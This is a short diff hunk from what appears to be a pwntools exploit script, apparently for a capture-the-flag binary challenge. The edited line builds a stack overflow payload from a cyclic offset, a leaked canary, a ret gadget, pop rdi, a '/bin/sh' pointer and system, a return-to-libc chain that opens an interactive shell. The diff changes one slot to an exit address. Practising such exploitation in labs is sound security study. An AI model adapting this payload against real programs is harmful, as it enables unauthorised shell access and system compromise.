@@ -62,5 +62,5 @@ log.info("AAAAAAAA_ret operation: {}".format(hex(ret)))
 
 raw_input("Exploit ?")
 idx = cyclic_find("cnaacoaa")
-p.sendline(spell+pad[:idx]+p64(canary)+RBP+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system))
+p.sendline(spell+pad[:idx]+p64(canary)+p64(exit)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system))
 p.interactive()
